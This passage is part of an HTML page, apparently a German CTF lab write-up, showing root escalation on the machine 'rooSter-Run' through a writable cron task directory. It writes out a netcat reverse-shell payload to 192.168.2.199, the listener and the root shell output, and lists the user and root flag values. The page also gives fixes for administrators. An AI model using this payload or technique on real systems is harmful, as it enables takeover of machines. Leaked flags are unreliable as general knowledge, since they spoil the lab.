+                                                   Privilege Escalation erfolgreich
+                     </pre>
+                 </div>
+            </div>
+        </section>
+
+         <!-- POC Section für Cronjob Exploit -->
+        <section id="proof-of-concept">
+            <h2>Proof of Concept: Ausnutzung der unsicheren Cronjob-Konfiguration</h2>
+            <p><strong>Kurzbeschreibung:</strong> Ein Cronjob führt regelmäßig das Skript `/opt/maintenance/backup.sh` als Root aus. Dieses Skript kopiert alle `.sh`-Dateien aus dem Verzeichnis `/opt/maintenance/pre-prod-tasks` in das Verzeichnis `/opt/maintenance/prod-tasks` und führt anschließend alle Dateien im `prod-tasks`-Verzeichnis mittels `run-parts` aus. Das Verzeichnis `/opt/maintenance/pre-prod-tasks` ist für andere Benutzer (hier `matthieu`) schreibbar. Dies ermöglicht es einem Angreifer, ein beliebiges Shell-Skript in `pre-prod-tasks` zu platzieren, das dann vom Cronjob als Root ausgeführt wird.</p>
+            <p><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugang zum System als Benutzer mit Schreibrechten für `/opt/maintenance/pre-prod-tasks` (hier `matthieu`).</li>
+                    <li>Der Cronjob, der `/opt/maintenance/backup.sh` als Root ausführt, muss aktiv sein.</li>
+                </ul>
+            </p>
+            <p><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+            <p class="analysis"><strong>Analyse Schritt 1:</strong> Erstellen einer Payload-Datei (z.B. `payload.sh`) im Verzeichnis `/opt/maintenance/pre-prod-tasks`. Die Payload enthält einen Befehl zur Herstellung einer Reverse Shell zum Angreifer.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 1:</strong> Die schädliche Datei wird im Zielverzeichnis platziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die Datei die Endung `.sh` hat und ausführbar ist (obwohl letzteres durch `run-parts` nicht zwingend erforderlich ist).<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Berechtigungen des Verzeichnisses.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance$ <span class="command">cd pre-prod-tasks/</span></div>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">echo '#!/bin/bash' > payload.sh</span></div>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4447 >/tmp/f' >> payload.sh</span></div>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">chmod +x payload.sh</span></div>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">ls -la</span></div>
+                      <pre>
+total 12
+drwx---rwt 2 root     root     4096 Dec  1 00:50 .
+drwxr-xr-x 4 root     root     4096 Sep 24 10:40 ..
+-rwxr-xr-x 1 matthieu matthieu  106 Dec  1 00:50 payload.sh
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse Schritt 2:</strong> Starten eines Netcat-Listeners auf dem Angreifer-System auf dem in der Payload angegebenen Port (hier 4447).</p>
+            <p class="evaluation"><strong>Bewertung Schritt 2:</strong> Der Listener ist bereit, die eingehende Verbindung der Reverse Shell zu empfangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Warten Sie auf die eingehende Verbindung, die erfolgt, sobald der Cronjob das `backup.sh`-Skript ausführt.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring und Egress Filtering können helfen, solche Verbindungen zu erkennen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4447</span></div>
+                     <pre>listening on [any] 4447 ...</pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse Schritt 3:</strong> Sobald der Cronjob läuft, kopiert `backup.sh` die Datei `payload.sh` nach `/opt/maintenance/prod-tasks` und `run-parts` führt sie aus. Die Reverse Shell verbindet sich zum Listener.</p>
+             <p class="evaluation"><strong>Bewertung Schritt 3:</strong> Der Listener empfängt die Verbindung. Die Shell meldet sich mit einem Root-Prompt (`#`), was die erfolgreiche Eskalation bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben Root-Zugriff.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Cronjob-Schwachstelle.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Ausgabe im Netcat Listener Fenster -->
+                     <pre>
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 44302
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+                     </pre>
+                      <div class="prompt root-prompt"># <span class="command"></span></div>
+                  </div>
+              </div>
+            <p><strong>Erwartetes Ergebnis:</strong> Erfolgreiche Erlangung einer interaktiven Shell mit root-Berechtigungen.</p>
+            <p><strong>Beweismittel:</strong> Die empfangene Shell mit Root-Kennung (`#` Prompt, `uid=0(root)`) auf dem Netcat-Listener.</p>
+            <p><strong>Risikobewertung:</strong> Hoch. Diese Fehlkonfiguration ermöglicht jedem Benutzer mit Schreibrechten auf `/opt/maintenance/pre-prod-tasks` die vollständige Übernahme des Systems als Root.</p>
+            <p><strong>Empfehlungen:</strong> Korrigieren Sie die Berechtigungen für `/opt/maintenance/pre-prod-tasks` (Entfernen des Schreibrechts für nicht-privilegierte Benutzer). Überarbeiten Sie das `backup.sh`-Skript, um das Kopieren und Ausführen von Dateien aus unsicheren Quellen zu verhindern. Führen Sie Cronjobs nach dem Prinzip der geringsten Rechte aus.</p>
+        </section>
+
+        <section id="flags">
+             <!-- Flag-Container für Zentrierung und Styling -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <!-- User Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/matthieu/user.txt</div> <!-- Befehl rekonstruiert -->
+                    <div class="flag-value"><span class="password">32af3c9a9cb2fb748aef29457d8cff55</span></div>
+                </div>
+
+                <!-- Root Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div> <!-- Befehl rekonstruiert -->
+                    <div class="flag-value"><span class="password">670ff72e9d8099ac39c74c080348ec17</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum extrahiert aus der ersten Nmap/Nikto Zeitangabe -->
+        <p>Berichtsdatum: 2023-11-30</p>
+    </footer>
+</body>
+</html>
